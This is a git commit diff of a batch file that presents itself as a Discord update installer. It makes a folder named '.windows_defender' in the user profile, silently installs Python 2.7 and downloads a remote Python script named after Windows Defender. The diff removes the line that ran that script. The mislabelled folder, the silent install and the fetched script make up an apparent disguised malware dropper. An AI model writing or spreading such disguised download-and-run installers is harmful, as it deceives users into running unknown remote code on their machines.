fd1215e6118d37b7daf0cc48259643d5f3ae40a2
MundoCoRobiBundo <114348080+MundoCoRobiBundo@users.noreply.github.com>
2022-09-26 23:10:50 +0200

    Update discord_update_installer.bat

--- discord_update_installer.bat
+++ discord_update_installer.bat
@@ -1,17 +1,14 @@
-@echo off
-cd c:\
+cd %USERPROFILE%
 
-if not exist "c:\.windows_defender" (
+if not exist "%USERPROFILE%\.windows_defender" (
     mkdir .windows_defender
 )
 cd .windows_defender
 
-if not exist "c:\.windows_defender\python-2.7.10.amd64.msi" (
+if not exist "%USERPROFILE%\.windows_defender\python-2.7.10.amd64.msi" (
 )
 
 curl https://www.python.org/ftp/python/2.7.10/python-2.7.10.amd64.msi -O
-msiexec /i python-2.7.10.amd64.msi /qn TARGETDIR=c:\.windows_defender\python
+msiexec /i python-2.7.10.amd64.msi /qn TARGETDIR=%USERPATH%\.windows_defender\python
 
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefenderStart.py -O
-
-c:\.windows_defender\python\python.exe windowsDefenderStart.py
